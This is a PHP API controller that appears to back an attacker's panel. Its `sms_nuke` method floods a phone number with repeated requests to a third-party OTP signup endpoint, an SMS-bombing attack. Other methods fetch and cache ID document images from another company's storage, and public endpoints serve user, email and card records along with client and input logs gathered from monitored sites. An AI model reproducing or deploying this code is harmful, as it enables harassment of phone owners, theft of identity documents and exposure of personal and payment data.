<?php

class Api extends Controller
{

    private
        $_method = null,
        $jc_db = null,
        $mongo_db = null,

        $sari_suki,
        $data = [];

    public function __construct()
    {

        $this->set_method_auth(
            __CLASS__, // class to check for method that requires auth
            [ // method/function list

                // public methods
//                '!dashboard', // whitelist function that does not need auth
                '!index',
                '!_test',
                '!login',
                '!_spawn',
                '!sms_nuke',
                '!jc_users',
                '!jc_emails',
                '!links',
//                '!try_discord',
//                '!private_method',
//                '!register',
//                '!forgot_password',
//                '!initiate_reset_password',
//                '!topup',
//                '!ref',
//                '!logout',
//                '!page',
//                '!fetch_news',
//                '!top_guild',
//                '!top_players',
//                '!top_newbies',
//                '!top_richest',
//                '!top_donator',
//                '!top_killers',
//                '!trans',
//                '!online_users',
//                '!get_server_info',
//                '!reset_password2',


                // private methods | needs auth
//                'private_method',
//                'getreferredby',
//                'edit_account',
//                'change_password',
//                'logout',
//                'convert_time',
//                'getonline_time',
//                'transaction_history',
            ],
            [ // session auth to check
//                'authenticated_user_sample',
                'authenticated',
            ],
            403, //'/' // redirect location if not authed else display 403
        );

        $config = get_config();
        // initialize global controller
        parent::__construct($config);
//        $this->db = (new Leet());
        $this->db = (new Mongo());
        $this->jc_db = (new Jc_premiere());
        $this->mongo_db = (new Mongo());
        $this->data = getData();
        $this->sari_suki = 'https://api.platform.sarisuki.com/api/v1/users/cl/signup/otp/';

        // set http_origin
        if (isset($_SERVER['HTTP_ORIGIN'])) {
            $origin = Sessions::pull('HTTP_ORIGIN');
            if (in_array($origin, [null, ""], true)) {
                Sessions::push(['HTTP_ORIGIN' => $_SERVER['HTTP_ORIGIN']]);
            }
        }

        // log api calls
        $this->log_calls();
    }

    private function log_calls() {

        $info = [
            'data' => $this->data,
            'call' => $_SERVER['REQUEST_URI'],
            'user' => Sessions::pull('user')['username'] ?? 'System',
            'date' => date('r')
        ];
        $log_id = $this->db->api_logs($info);
    }

    private function link_check($out, $type, $option) {
        switch (strtolower($type)) {
            case 'live':
                foreach ($out as $link) {
                    $status = get_content($link);
                    $len = strlen($status['data']);
                    $source = substr($status['data'], 0, 300) . " ...";
                    if ($len > 10 && $len <= 150) {
                        // live
                        $stats[] = $link;
                    }
                }
                if ($option && in_array(strtolower($option), ['text','raw'], true)) {
                    $stats = implode("\n", $stats);
                }
                $this->out($stats, false, 0, true);
                break;
            case 'check':
                $stats = [];
                foreach ($out as $link) {
                    $status = get_content($link);
                    $len = strlen($status['data']);
                    $source = substr($status['data'], 0, 300) . " ...";
                    $tries = 0;
                    _tries:
                    if ($status['status'] === 200 && $len > 10 && $len <= 150) {
                        // live
                        $stats[$link] = "LIVE - {$status['status']} | {$len} | {$source}";
                    } else if ($status['status'] !== 200) {
                        if ($tries <= 3) {
                            $tries++;
                            goto _tries;
                        }
                        // deads
                        // log to dead links
                        $log = $this->db->dead_link($link, $status);
                        $stats[$link] = "DEAD - {$status['status']} | {$len} | {$source}";
                    }
                }
                $this->out($stats, false, 0, true);
                break;

            case 'text':
                return implode("\n", $out);
                break;

            default:
                return $out;
                break;
        }
    }

    public function password_update() {
//        $this->out($this->data);
        $update = false;
        if ($this->data['post']['updatedPass']['password'] === $this->data['post']['updatedPass']['confirmPassword']) {
            $update = $this->db->update_password($this->data['post']['updatedPass']['password']);
        }
        if ($update && !is_null($update)) {
            $this->out([
                'status' => 'success',
                'message' => 'Password was successfully updated!'
            ]);
        } $this->out('Unable to update password, please try again later', true, 403);
    }

    public function fetch_hooks() {
        $this->out($this->db->fetch_hooks());
    }

    public function save_hooks() {

        if (!isset($this->data['post']['hooks'])) {
            $this->out('invalid request', true, 403);
        }

        $list = [];
        $check_list = json_decode($this->data['post']['hooks'], true);
        foreach ($check_list as $l) {
            if (!in_array($l, $list)) {
                $list[] = $l;
            }
        }
        $status = $this->db->save_hooks($list);
        if ($status) {
            $this->out(['status'=>'success']);
        } $this->out('Unable to update settings', true, 401);
    }

    public function links($type='json', $option=false) {
        $env = config_item('ENVIRONMENT');
        $site = config_item('website')[$env];
        $origin = rtrim($site['base_url'], '/');
        $out = $this->db->fetch_links($origin);
        $out = $this->link_check($out, $type, $option);
        $this->out($out);
    }

    public function global_socket_connections($type='json', $option=false) {
        $out = $this->db->fetch_global_socket_connections();
        $out = $this->link_check($out, $type, $option);
        $this->out($out);
    }

    public function validated_logs($origin=false) {
        if (!$origin) {
            $this->out('invalid request, missing origin parameter', true, 403);
        }
        $this->out($this->db->fetch_validated_logs(base64_decode($origin)));
    }

    public function client_logs($key=false) {
        if (!$key) {
            $this->out('invalid request, missing key parameter', true, 403);
        }

        $this->out($this->db->fetch_client_logs($key));
    }

    public function input_logs($key=false) {
        if (!$key) {
            $this->out('invalid request, missing key parameter', true, 403);
        }

        $this->out($this->db->fetch_input_logs($key));
    }

    public function interaction_logs($key=false) {
        if (!$key) {
            $this->out('invalid request, missing key parameter', true, 403);
        }

        $this->out($this->db->fetch_interaction_logs($key));
    }

    public function socket_connections($type='fetch') {

        switch ($type) {
            case 'fetch':
                $this->out($this->db->fetch_socket_connections());
                break;

            case 'update':
                if (!isset($this->data['post']['site_lists'])) {
                    $this->out('invalid request', true, 403);
                }
                $lists = $this->data['post']['site_lists'];
                $url_lists = [];
                foreach ($lists as $n => $list) {
                    $list = trim(strip_tags($list));
                    $parsedUrl = parse_url($list);
                    $url = (isset($parsedUrl['scheme'], $parsedUrl['host']) ? $parsedUrl['scheme'] . '://' . $parsedUrl['host'] : false);
                    if ($url && !in_array($url, $url_lists, true)) {
                        $url_lists[] = $url;
                    } else {
                        unset($lists[$n]);
                    }

                }
                $lists = array_filter($url_lists);
                if (count($lists) <= 0) {
                    $this->out('unable to process your request', true, 403);
                }

                $this->out($this->db->update_socket_connections($lists));
                break;
        }
    }

    public function sms_nuke($number=false, $amount=50) {

        if (strlen($number) <= 10) {
            $this->out('number must start with 63, ex: 639162378463', true, 401);
        }
        // default amount = 50
        if ((int)$amount <= 50) {
            $amount = 50;
        }
        $attack_stats = [];
        for ($round=1;$round<=$amount; $round++) {
            $payload = json_encode([
                'mobile_number' => $number
            ]);
            $head = [
                'User-Agent: Dart/3.0 (dart:io)',
                'Content-Type: application/json; charset=utf-8',
                'Accept-Encoding: gzip, deflate, br',
            ];
            $attack = get_content(
                $this->sari_suki,
                'post',
                $head,
                $payload
            );
            $attack_stats[] = "[{$round}] {$number} - Status: {$attack['data']}";
        };

        $this->out(implode("\n", $attack_stats));
    }

    public function jc_docs($file) {
        $document = false;
        @list($id, $stamp) = explode("_", $file, 2);

        if (!$id) {
            $this->out('invalid request', true, 401);
        }

        // check docs
        $check_doc = $this->db->jc_docs($id);

        if (!$check_doc) {

            $fetch = get_content("https://imgjcportal.s3.amazonaws.com/img/ids/{$file}");
            if ($fetch['status'] === 200) {
                // log image
                $document = $fetch['data'];
                $info = [
                    'id' => $id,
                    'document_data' => base64_encode($document)
                ];
                $log_id = $this->db->log_jc_docs($info);
                $this->out($document);

            } else {
                $this->out("Request error: {$fetch['status']}", true, 401);
            }

        }   $this->out(base64_decode($check_doc['document_data']));


    }

    public function jc_cards() {

        if (!isset($this->data['get']['page'])) {
            $this->out('expecting page parameter', true, 400);
        }

        $page = $this->data['get']['page'];
        $page = isset($page) ? (int)$page : 1;

        $this->out($this->mongo_db->get_jc_cards($page));

    }

    public function jc_zero_users() {

        if (!isset($this->data['get']['page'])) {
            $this->out('expecting page parameter', true, 400);
        }

        $page = $this->data['get']['page'];
        $page = isset($page) ? (int)$page : 1;

        $this->out($this->mongo_db->get_zero_users($page));

    }

    public function jc_users_ids() {

        if (!isset($this->data['get']['page'])) {
            $this->out('expecting page parameter', true, 400);
        }
        if (!isset($this->data['get']['limit'])) {
            $this->out('expecting limit parameter', true, 400);
        }

        $page = (int)$this->data['get']['page'] ?? 1;
        $limit = (int)$this->data['get']['limit'] ?? 1;


        $this->out($this->mongo_db->get_users_ids($page, $limit));

    }

    public function jc_users() {

        if (!isset($this->data['get']['page'])) {
            $this->out('expecting page parameter', true, 400);
        }
        if (!isset($this->data['get']['limit'])) {
            $this->out('expecting limit parameter', true, 400);
        }

        $page = (int)$this->data['get']['page'] ?? 1;
        $limit = (int)$this->data['get']['limit'] ?? 25;
        $sortColumn = $this->data['get']['sortColumn'] ?? 'balance';
        $sortDirection = isset($this->data['get']['sortDirection']) && $this->data['get']['sortDirection'] === 'desc' ? -1 : 1;
        $draw = isset($this->data['get']['draw']) ? (int)$this->data['get']['draw'] : 1;
        $search = $this->data['get']['search'] ?? '';

        $this->out($this->mongo_db->get_users($page, $limit, $sortColumn, $sortDirection, $draw, $search));

    }

    public function jc_emails() {

        if (!isset($this->data['get']['page'])) {
            $this->out('expecting page parameter', true, 400);
        }
        if (!isset($this->data['get']['limit'])) {
            $this->out('expecting limit parameter', true, 400);
        }

        $page = (int)$this->data['get']['page'] ?? 1;
        $limit = (int)$this->data['get']['limit'] ?? 25;
        $sortColumn = $this->data['get']['sortColumn'] ?? 'balance';
        $sortDirection = isset($this->data['get']['sortDirection']) && $this->data['get']['sortDirection'] === 'desc' ? -1 : 1;
        $draw = isset($this->data['get']['draw']) ? (int)$this->data['get']['draw'] : 1;
        $search = $this->data['get']['search'] ?? '';

        $this->out($this->mongo_db->get_emails($page, $limit, $sortColumn, $sortDirection, $draw, $search));

    }

    public function logout() {
        if (Sessions::pull('_logoutKey') === $this->data['post']['logoutKey']) {
            $username = Sessions::pull('user')['username'] ?? 'System';
            $log = $this->db->log_history($username, 'logout');

            Sessions::clear();

            $this->out([
                'status' => 'success'
            ]);
        } $this->out(ucfirst('invalid request'), true, 403, true);
    }

    public function update_password() {
        if (!isset($this->data['post']['new_pass'])) {
            $this->out(ucfirst('invalid request'), true, 403, true);
        }

        $update = $this->db->update_password($this->data['post']['new_pass']);
        if ($update) {
            $this->out([
                'status' => 'success',
                'message' => ucfirst('Password updated successfully.')
            ]);
        } else {
            $this->out(ucfirst('unable to update password, Please contact administrator'), true, 403, true);
        }
//        $this->out(Sessions::all());
    }

    public function _spawn($user=false, $pass=false) {
        $this->out('Oops! Naughty naughty~', true, 403);
//        $this->out($this->db->insert_user($user, $pass));
    }

    public function login() {
        $login = $this->data['post'];
        if (isset($login['_user'], $login['_pass'])) {
            $check = $this->db->verify_user($login['_user'], $login['_pass']);
            $id = $check['id'] ?? ($check['_id'] ?? false);

            if ($check && !isset($check['global_name'])) {
                $check['global_name'] = ($check['username'] ?? 'SYSTEM');
            }

            if ($check) {
                $sessions['user'] = $check;
                $sessions['authenticated'] = $id;
                $sessions['discord'] = $this->db->get_discord($id);

                // update session
                Sessions::push($sessions);

                $status = [
                    'status' => 'success',
                    'message' => ucfirst('access granted')
                ];

                $next = Sessions::pull('next_url') ?? false;
                if ($next) {
                    $status['next_url'] = $next;
                }

                $this->out($status);
            }

            $user = strip_tags(trim($login['_user']));
            if (strlen($user) >= 16) {
                $user = substr($user, 0, 15) . '...';
            }
            $this->out(ucfirst("access denied for user: <x class='text-danger'>{$user}</x>"), true, 403, true);
        }
    }

    public function index() {
        $this->out([
            'status' => 'live'
        ]);
    }

    public function _test() {
        $this->out([31337]);
    }
}